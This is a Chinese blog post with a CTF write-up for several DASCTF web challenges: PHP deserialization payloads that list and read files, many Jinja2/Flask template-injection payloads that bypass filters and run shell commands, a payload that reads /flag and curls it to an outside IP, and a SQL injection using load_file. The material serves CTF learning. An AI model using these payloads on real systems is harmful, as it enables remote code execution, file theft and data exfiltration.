<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="ez_serialize源码

PHP标准库
https://www.php.net/manual/zh/book.spl.php
SLP类中存在能够进行文件处理和迭代的类：



类
描述



DirectoryIterator
遍历目录


FilesystemIterator
遍历目录


">
    

    <!--Author-->
    
        <meta name="author" content="0xEaS">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="dasctf部分wp"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="船到桥头自然直"/>

    <!--Type page-->
    
        <meta property="og:type" content="article" />
    

    <!--Page Cover-->
    

    
        <meta name="twitter:card" content="summary" />
    
    
    

    <!-- Title -->
    
    <title>dasctf部分wp - 船到桥头自然直</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/style.css">


    <!-- Google Analytics -->
    


<meta name="generator" content="Hexo 5.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about.html">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact.html">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2021/03/29/dasctf%E9%83%A8%E5%88%86wp/">
                dasctf部分wp
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-29</span>
            
            
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <h3 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h3><p>源码</p>
<pre><code></code></pre>
<p>PHP标准库</p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/book.spl.php">https://www.php.net/manual/zh/book.spl.php</a></p>
<p>SLP类中存在能够进行文件处理和迭代的类：</p>
<table>
<thead>
<tr>
<th>类</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>DirectoryIterator</td>
<td>遍历目录</td>
</tr>
<tr>
<td>FilesystemIterator</td>
<td>遍历目录</td>
</tr>
<tr>
<td>GlobIterator</td>
<td>遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag*</td>
</tr>
<tr>
<td>SplFileObject</td>
<td>读取文件，按行读取，多行需要遍历</td>
</tr>
</tbody></table>
<p>exp</p>
<p>直接读取/var/www/html下面的文件</p>
<pre><code>&lt;?php
class A&#123;
    public $class=&#39;FilesystemIterator&#39;;
    public $para=&quot;/var/www/html&quot;;
    public $check;
    &#125;
$a  = new A();
echo serialize($a);</code></pre>
<pre><code>&lt;?php
class A&#123;
    public $class=&#39;SplFileObject&#39;;
    public $para=&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;;
    public $check;
    &#125;

$a  = new A();
echo serialize($a);</code></pre>
<h3 id="baby-flask"><a href="#baby-flask" class="headerlink" title="baby_flask"></a>baby_flask</h3><p>黑名单</p>
<pre><code>blacklist&lt;/br&gt;   
&#39;.&#39;,&#39;[&#39;,&#39;\&#39;&#39;,&#39;&quot;&#39;,&#39;&#39;\\&#39;,&#39;+&#39;,&#39;:&#39;,&#39;_&#39;,&lt;/br&gt;   
&#39;chr&#39;,&#39;pop&#39;,&#39;class&#39;,&#39;base&#39;,&#39;mro&#39;,&#39;init&#39;,&#39;globals&#39;,&#39;get&#39;,&lt;/br&gt;   
&#39;eval&#39;,&#39;exec&#39;,&#39;os&#39;,&#39;popen&#39;,&#39;open&#39;,&#39;read&#39;,&lt;/br&gt;   
&#39;select&#39;,&#39;url_for&#39;,&#39;get_flashed_messages&#39;,&#39;config&#39;,&#39;request&#39;,&lt;/br&gt;   
&#39;count&#39;,&#39;length&#39;,&#39;０&#39;,&#39;１&#39;,&#39;２&#39;,&#39;３&#39;,&#39;４&#39;,&#39;５&#39;,&#39;６&#39;,&#39;７&#39;,&#39;８&#39;,&#39;９&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;&lt;/br&gt;   
&lt;/br&gt;</code></pre>
<p>可以看到几乎都过滤了</p>
<p>config过滤了可以用lipsum获取数字（当然也可以用其他的）</p>
<p><img src="/images/64.png"></p>
<p>利用index 返回了 1</p>
<p><img src="/images/65.png"></p>
<p>因为过滤了引号，所以可以利用join过滤器来绕过</p>
<p><img src="/images/66.png"></p>
<p>点 .  []  也被过滤了，利用 attr 和 pop获取 _</p>
<pre><code>&#123;% set id=dict(ind=a,ex=a)|join%&#125;
&#123;% set pp=dict(po=a,p=a)|join%&#125;
&#123;% set nn=dict(n=a)|join%&#125;
&#123;% set tt=dict(t=a)|join%&#125;
&#123;% set ff=dict(f=a)|join%&#125;
&#123;% set five=(lipsum|string|list)|attr(id)(tt) %&#125;
&#123;% set three=(lipsum|string|list)|attr(id)(nn) %&#125;
&#123;% set one=(lipsum|string|list)|attr(id)(ff) %&#125;
&#123;% set shiba=five*five-three-three-one %&#125;
&#123;% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %&#125;
&#123;&#123;xiahuaxian&#125;&#125;
相当于
(lipsum|string|list)[18] &lt;=&gt; (lipsum|string|list).pop(18)</code></pre>
<p><img src="/images/67.png"></p>
<p>最终payload</p>
<pre><code>1&#123;% set id=dict(ind=a,ex=a)|join%&#125;
&#123;% set pp=dict(po=a,p=a)|join%&#125;
&#123;% set ls=dict(ls=a)|join%&#125;
&#123;% set ppe=dict(po=a,pen=a)|join%&#125;
&#123;% set gt=dict(ge=a,t=a)|join%&#125;
&#123;% set cr=dict(ch=a,r=a)|join%&#125;
&#123;% set nn=dict(n=a)|join%&#125;
&#123;% set tt=dict(t=a)|join%&#125;
&#123;% set ff=dict(f=a)|join%&#125;
&#123;% set ooqq=dict(o=a,s=a)|join %&#125;
&#123;% set rd=dict(re=a,ad=a)|join%&#125;
&#123;% set five=(lipsum|string|list)|attr(id)(tt) %&#125;
&#123;% set three=(lipsum|string|list)|attr(id)(nn) %&#125;
&#123;% set one=(lipsum|string|list)|attr(id)(ff) %&#125;
&#123;% set shiba=five*five-three-three-one %&#125;
&#123;% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %&#125;
&#123;% set gb=(xiahuaxian,xiahuaxian,dict(glob=a,als=a)|join,xiahuaxian,xiahuaxian)|join %&#125;
&#123;% set bin=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join %&#125;
&#123;% set chcr=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;
&#123;% set xiegang=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%&#125;
&#123;% set space=chcr(three*three*five-five-five-three) %&#125;
&#123;% set shell=(ls,space,xiegang,dict(var=a)|join,xiegang,dict(www=a)|join,xiegang,dict(flask=a)|join)|join %&#125;
&#123;&#123;(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()&#125;&#125;
</code></pre>
<p><strong>方法2</strong></p>
<p>python3支持unicode编码</p>
<pre><code>测试的使用&#123;%print 𝟡%&#125;如果可以正常回显就代表支持</code></pre>
<p>参考文章</p>
<p><a target="_blank" rel="noopener" href="http://www.plasf.cn/articles/dasctf202103.html">http://www.plasf.cn/articles/dasctf202103.html</a></p>
<p>这个网站有各种各样的unicode编码方式</p>
<p><a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/bidiclass/EN">https://www.compart.com/en/unicode/bidiclass/EN</a></p>
<p><img src="/images/68.png"></p>
<p><img src="/images/69.png"></p>
<pre><code>&#123;%set a=dict(po=aa,p=aa)|join%&#125; # pop
&#123;%set b=lipsum|string|list|attr(a)(𝟙𝟠)%&#125; # _
&#123;%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%&#125; # globals
&#123;%set d=(b,b,dict(ge=cc,tit=dd,em=aa)|join,b,b)|join%&#125; # getitem
&#123;%set e=dict(o=cc,s=aa)|join%&#125; # os
&#123;%set f=lipsum|string|list|attr(a)(𝟡)%&#125; # 空格
&#123;%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟠)%&#125; # 斜杠
&#123;%set i=(dict(cat=aa)|join,f,g,dict(flag=aa)|join)|join%&#125; # cat /flag
&#123;%set h=(a,dict(en=aa)|join|join)|join%&#125; # popen
&#123;%set i=dict(re=aa,ad=aa)|join%&#125; # read
&#123;%set z=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟝)%&#125; #点
&#123;%set j=(dict(ls=aa)|join,f,g,(dict(var=aa)|join),g,(dict(www=aa)|join),g,(dict(flask=aa)|join)|join)|join%&#125; #ls /var/www/flask
&#123;%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%&#125;&#123;&#123;j&#125;&#125;
#最后拼接起来
#&#123;&#123;lipsum.__globals__['os'].popen('ls /var/www/flask').read()&#125;&#125;</code></pre>
<p><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/2.11.x/templates/">jinja2官方文档</a></p>
<pre><code>&#123;%%&#125;可以用来声明变量，当然也可以用于循环语句和条件语句。
&#123;&#123;&#125;&#125;用于将表达式打印到模板输出
&#123;##&#125;表示未包含在模板输出中的注释
##可以有和&#123;%%&#125;相同的效果</code></pre>
<pre><code>&#123;% set x= 'abcd' %&#125;  声明变量
&#123;% for i in ['a','b','c'] %&#125;&#123;&#123;i&#125;&#125;&#123;%endfor%&#125; 循环语句
&#123;% if 25==5*5 %&#125;&#123;&#123;1&#125;&#125;&#123;% endif %&#125;  条件语句</code></pre>
<p><strong>[BJDCTF 2nd]fake google</strong>用来复现的地方（在buu平台）</p>
<pre><code>__class__            类的一个内置属性，表示实例对象的类。
__base__             类型对象的直接基类
__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.
__init__             初始化类，返回的类型是function
__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#39;b&#39;]，就是a.__getitem__(&#39;b&#39;)
__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()]
__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app。
get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app。
lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__['os'].popen('ls').read()&#125;&#125;
current_app          应用上下文，一个全局变量。

request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/proc\self\fd/3&#39;).read()
request.args.x1        get传参
request.values.x1      所有参数
request.cookies      cookies参数
request.headers      请求头参数
request.form.x1        post传参    (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data           post传参    (Content-Type:a/b)
request.json         post传json  (Content-Type: application/json)
config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__['os'].popen('ls').read() &#125;&#125;
g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#39;flask_ssti&#39;&gt;</code></pre>
<p>常用的过滤器</p>
<pre><code>
int()：将值转换为int类型；

float()：将值转换为float类型；

lower()：将字符串转换为小写；

upper()：将字符串转换为大写；

title()：把值中的每个单词的首字母都转成大写；

capitalize()：把变量值的首字母转成大写，其余字母转小写；

trim()：截取字符串前面和后面的空白字符；

wordcount()：计算一个长字符串中单词的个数；

reverse()：字符串反转；

replace(value,old,new)： 替换将old替换为new的字符串；

truncate(value,length=255,killwords=False)：截取length长度的字符串；

striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；

escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。

safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;'<em>hello</em>'|safe&#125;&#125;；

list()：将变量列成列表；

string()：将变量转换成字符串；

join()：将一个序列中的参数值拼接成字符串。示例看上面payload；

abs()：返回一个数值的绝对值；

first()：返回一个序列的第一个元素；

last()：返回一个序列的最后一个元素；

format(value,arags,*kwargs)：格式化字符串。比如：&#123;&#123; "%s" - "%s"|format('Hello?',"Foo!") &#125;&#125;将输出：Helloo? - Foo!

length()：返回一个序列或者字典的长度；

sum()：返回列表内数值的和；

sort()：返回排序后的列表；

default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#39;xiaotuo&#39;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。

length()返回字符串的长度，别名是count</code></pre>
<p>比如查看一下os._wrap_close类所处空间下可使用的module,方法和变量,利用.keys()爆出这个dict的所有键名</p>
<pre><code>print(&#39;&#39;.__class__.__bases__[0].__subclasses__()[139].__init__.__globals__.keys())</code></pre>
<p>一下注入点均是name</p>
<p>#0x01</p>
<p>用以下已有的函数，去得到builtins，然后用eval就可以了</p>
<pre><code>&#123;&#123;url_for.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125;</code></pre>
<p>#0x02</p>
<p>另一种姿势去得到builtins</p>
<pre><code>&#123;&#123;x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125;</code></pre>
<p>这里的x任意26个英文字母的任意组合都可以，同样可以得到<code>__builtins__</code>然后用eval就可以了。</p>
<p>#0x03</p>
<p>学习一下用<code>&#123;% %&#125;</code>来SSTI</p>
<pre><code>&#123;% for i in ''.__class__.__mro__[1].__subclasses__() %&#125;&#123;% if i.__name__=='_wrap_close' %&#125;&#123;% print i.__init__.__globals__['popen']('ls').read() %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre>
<p>#0x04</p>
<p>因为我们没法直接使用chr函数，所以需要通过<code>__builtins__</code>找到他</p>
<pre><code>?name=&#123;%set chr=url_for.__globals__.__builtins__.chr%&#125;&#123;%print url_for.__globals__[chr(111)%2bchr(115)].popen(chr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()%&#125;</code></pre>
<p>#0x05</p>
<p>过滤了单双引号，可以用request来绕过</p>
<p>get</p>
<pre><code>?a=os&amp;b=popen&amp;c=cat /flag&amp;name=&#123;&#123;url_for.__globals__[request.args.a][request.args.b](request.args.c).read()&#125;&#125;</code></pre>
<p>post</p>
<pre><code>?name=&#123;&#123;url_for.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()&#125;&#125;
cookie:a=os;b=popen;c=cat /flag</code></pre>
<p>当然还可以使用cookie绕过。看上面！</p>
<p>#0x06</p>
<p>字符串拼接，这里用config拿到字符串</p>
<pre><code>?name=&#123;&#123;url_for.__globals__[(config.__str__()[2])%2B(config.__str__()[42])]&#125;&#125;
等价于
?name=&#123;&#123;url_for.__globals__['os']&#125;&#125;</code></pre>
<p>#0x07</p>
<p>过滤了[，用点绕过或__getitem，或pop</p>
<pre><code>?name=&#123;&#123;url_for.__globals__.__builtins__.eval("__import__('os').popen('cat /flag').read()")&#125;&#125;</code></pre>
<pre><code>&#123;&#123;''.__class__.__mro__.__getitem__(1).__subclasses__().pop(117).__init__.__globals__.popen('ls').read()&#125;&#125;</code></pre>
<p>使用request绕过的话可以这样</p>
<pre><code>?name=&#123;&#123;url_for.__globals__.os.popen(request.cookies.c).read()&#125;&#125;
Cookie:c=cat /flag</code></pre>
<p>#0x08</p>
<p>点  .  和 [ 都被ban了 ，用attr()绕过 </p>
<p>！！有点小问题</p>
<pre><code>&#123;&#123;()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(177)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("dir").read()')&#125;&#125;</code></pre>
<p>#0x09  16进制绕过</p>
<pre><code>&quot;__class__&quot;==&quot;\x5f\x5fclass\x5f\x5f&quot;==&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;
对于python2的话，还可以利用base64进行绕过
&quot;__class__&quot;==(&quot;X19jbGFzc19f&quot;).decode(&quot;base64&quot;)</code></pre>
<pre><code>&#123;%print(
()|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f") 
//__class__

|attr("\x5f\x5f\x62\x61\x73\x65\x5f\x5f")      
//__base__

|attr("\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f")()
//__subclasses__

|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")(202)   
//__getitem__

|attr("\x5f\x5f\x69\x6e\x69\x74\x5f\x5f")  
//__init__

|attr("\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f") 
//__globals__

|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")("\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f")
//__getitem__('__builtins')

|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")("\x65\x76\x61\x6c") 
//__getitem__('eval')

("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74\x27\x29\x2e\x72\x65\x61\x64\x28\x29")
//("__import__('os').popen('cat flag.txt').read()")
)%&#125;</code></pre>
<p>#0x0A</p>
<p>在jinja2里面可以利用~进行拼接</p>
<pre><code>&#123;% set a='__cla' %&#125;&#123;% set b='ss__'%&#125;&#123;%print( ''[a~b])%&#125;</code></pre>
<p>#0x0B</p>
<p>大小写转换</p>
<p>前提是过滤的只是小写</p>
<pre><code>&#123;&#123;''["__CLASS__".lower()]&#125;&#125;</code></pre>
<p>#0x0C</p>
<p>拼接</p>
<pre><code>&quot;cla&quot;+&quot;ss&quot;</code></pre>
<p>反转</p>
<pre><code>&quot;__ssalc__&quot;[::-1]</code></pre>
<pre><code>&quot;&quot;[&quot;__cla&quot;&quot;ss__&quot;]
&quot;&quot;.__getattribute__(&quot;__cla&quot;&quot;ss__&quot;)
&quot;&quot;[&quot;__ssalc__&quot;[::-1]]
&quot;&quot;.__getattribute__(&quot;__ssalc__&quot;[::-1])</code></pre>
<p>#0x0D</p>
<p>除了第一个其他几个我测的时候会出错。不知道为啥！！</p>
<pre><code>&#123;&#123;url_for.__globals__['__builtins__']&#125;&#125;
&#123;&#123;url_for.__globals__.__getitem__('__builtins__')&#125;&#125;
&#123;&#123;url_for.__globals__.pop('__builtins__')&#125;&#125;
&#123;&#123;url_for.__globals__.get('__builtins__')&#125;&#125;
&#123;&#123;url_for.__globals__.setdefault('__builtins__')&#125;&#125;</code></pre>
<p><strong>过滤器</strong></p>
<pre><code>Variables can be modified by filters. Filters are separated from the variable by a pipe symbol (|) and may 
have optional arguments in parentheses. Multiple filters can be chained. The output of one filter is 
applied to the next.
For example, &#123;&#123; name|striptags|title &#125;&#125; will remove all HTML Tags from variable name and title-case the
output (title(striptags(name))).

变量可以通过过滤器修改。过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数。可以链接多
个过滤器。一个过滤器的输出应用于下一个过滤器。

例如，&#123;&#123; name|striptags|title &#125;&#125; 将删除变量名中的所有HTML标记，并将title大小写为输出(title(striptags(name)))。</code></pre>
<p>attr</p>
<pre><code>Get an attribute of an object. foo|attr(&quot;bar&quot;) works like foo.bar just that always an attribute is returned and 
items are not looked up.</code></pre>
<p>也就是说 attr用于获取变量</p>
<p>具体实例看上面！</p>
<p>format</p>
<pre><code>&#123;&#123; "%s, %s!"|format(greeting, name) &#125;&#125;</code></pre>
<pre><code>&quot;&quot;[&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)] ==&quot;&quot;.__class__</code></pre>
<p>join</p>
<pre><code>Return a string which is the concatenation of the strings in the sequence. The separator between elements is an
empty string per default, you can define it with the optional parameter:

&#123;&#123; [1, 2, 3]|join('|') &#125;&#125;
    -&gt; 1|2|3

&#123;&#123; [1, 2, 3]|join &#125;&#125;
    -&gt; 123
It is also possible to join certain attributes of an object:
&#123;&#123; users|join(', ', attribute='username') &#125;&#125;</code></pre>
<pre><code>&quot;&quot;[[&#39;__clas&#39;,&#39;s__&#39;]|join] 或者 &quot;&quot;[(&#39;__clas&#39;,&#39;s__&#39;)|join]  ==  &quot;&quot;.__class__</code></pre>
<p>replace reverse</p>
<p>可以利用替换和反转还原回我们要用的字符串</p>
<pre><code>&quot;__claee__&quot;|replace(&quot;ee&quot;,&quot;ss&quot;) 构造出字符串 &quot;__class__&quot;
&quot;__ssalc__&quot;|reverse 构造出 &quot;__class__&quot;</code></pre>
<p>string</p>
<pre><code>().__class__   出来的是&lt;class &#39;tuple&#39;&gt;
(().__class__|string)[0] 出来的是&lt;</code></pre>
<p>select unique</p>
<pre><code>Filters a sequence of objects by applying a test to each object, and only selecting the objects with the test succeeding.
If no test is specified, each object will be evaluated as a boolean.
通过对每个对象应用测试并仅选择测试成功的对象来筛选对象序列。
如果没有指定测试，则每个对象都将被计算为布尔值

Returns a list of unique items from the given iterable.</code></pre>
<pre><code>()|select|string
结果如下
&lt;generator object select_or_reject at 0x0000022717FF33C0&gt;
012345678901234567890123456789012345678901234567890123456</code></pre>
<p>拼接</p>
<pre><code>(()|select|string)[24]~
(()|select|string)[24]~
(()|select|string)[15]~
(()|select|string)[20]~
(()|select|string)[6]~
(()|select|string)[18]~
(()|select|string)[18]~
(()|select|string)[24]~
(()|select|string)[24]

得到字符串 __class__</code></pre>
<p>list</p>
<p>转换成列表<br>更多的用途是配合上面的string转换成列表，就可以调用列表里面的方法取字符了<br>只是单纯的字符串的话取单个字符方法有限</p>
<pre><code>(()|select|string)[0]
如果中括号被过滤了，挺难的
但是列表的话就可以用pop取下标了
当然都可以使用__getitem__</code></pre>
<pre><code>(()|select|string|list).__getitem__(24)~
(()|select|string|list).pop(24)~
(()|select|string|list)|attr(&#39;__getitem__&#39;)(15)~</code></pre>
<p>length，count</p>
<p>获取数字</p>
<pre><code>&#123;%set pp=dict(po=a,p=a)|join|length%&#125; = 3
&#123;%set pp=dict(p=a)|join|length%&#125; = 1
&#123;%set pp=dict(p=a)|join|count%&#125; = 1</code></pre>
<p><strong>print被ban 可以用反弹shell，贴个别人的脚本</strong></p>
<pre><code>?name=
&#123;% set c=dict(c=z)|join|length %&#125;
&#123;% set cc=dict(cc=z)|join|length %&#125;
&#123;% set ccc=dict(ccc=z)|join|length %&#125;
&#123;% set cccc=dict(cccc=z)|join|length %&#125;
&#123;% set ccccc=dict(ccccc=z)|join|length %&#125;
&#123;% set cccccc=dict(cccccc=z)|join|length %&#125;
&#123;% set ccccccc=dict(ccccccc=z)|join|length %&#125;
&#123;% set cccccccc=dict(cccccccc=z)|join|length %&#125;
&#123;% set ccccccccc=dict(ccccccccc=z)|join|length %&#125;
&#123;% set cccccccccc=dict(cccccccccc=z)|join|length %&#125;
&#123;% set space=(()|select|string|list).pop(ccccc*cc) %&#125;
&#123;% set xhx=(()|select|string|list).pop(ccc*cccccccc) %&#125;
&#123;% set point=(config|string|list).pop(cccccccccc*cc*cccccccccc-ccccccccc) %&#125;
&#123;% set maohao=(config|string|list).pop(cc*ccccccc) %&#125;
&#123;% set xiegang=(config|string|list).pop(-cccccccc*cccccccc) %&#125;
&#123;% set globals=(xhx,xhx,dict(globals=z)|join,xhx,xhx)|join %&#125;
&#123;% set builtins=(xhx,xhx,dict(builtins=z)|join,xhx,xhx)|join %&#125;
&#123;% set open=(lipsum|attr(globals)).get(builtins).open %&#125;
&#123;% set result=open((xiegang,dict(flag=z)|join)|join).read() %&#125;
&#123;% set curlcmd=(dict(curl=z)|join,space,dict(http=z)|join,maohao,xiegang,xiegang,c,c,cccccccc,point,ccc,c,point,c,cccccc,cccccccc,point,c,ccccccccc,cccccccc,maohao,ccc,ccccccccc,c,c,c,xiegang,result)|join %&#125; 
&#123;% set ohs=dict(o=z,s=z)|join %&#125;
&#123;% set shell=(lipsum|attr(globals)).get(ohs).popen(curlcmd) %&#125;</code></pre>
<p><strong>常用payload</strong></p>
<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__")('os').popen('ls /').read()")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
// 查看根目录</code></pre>
<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
//读取文件</code></pre>
<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['__impo'+'rt__']('o'+'s').listdir('/')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre>
<h3 id="bsetDB"><a href="#bsetDB" class="headerlink" title="bsetDB"></a>bsetDB</h3><p>这题没做过，服务器直接崩掉。看了别人的wp，难度容易。</p>
<p>考点：联合查询+load_file文件读取</p>
<p>注释中给了sql查询句子。</p>
<pre><code>&lt;!-- SELECT * FROM users WHERE id = &#39;$query&#39; OR username = \&quot;$query\&quot; --!&gt;</code></pre>
<p>过滤了单引号，空格。但双引号没有被ban</p>
<p>绕过空格的方法挺多的，不列举了。</p>
<pre><code>l&quot;/**/union/**/select/**/1,2,3#
接下去就是日常查表，查字段，查数据。
回显出flag.txt 但听说文件在/flag里

读数据了这里使用load_file()函数
l&quot;/**/union/**/select/**/(select/**/load_file(0x2f666c6167)),2,3#</code></pre>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113866139">https://blog.csdn.net/rfrder/article/details/113866139</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425">https://blog.csdn.net/miuzzx/article/details/110220425</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/115272645">https://blog.csdn.net/rfrder/article/details/115272645</a></p>
<p><a target="_blank" rel="noopener" href="https://shimo.im/docs/lf9OcEmdH70MC17f">https://shimo.im/docs/lf9OcEmdH70MC17f</a></p>

    </div>

    

    

    <!-- Comments -->
    

</div>
        </section>

    </div>
</div>


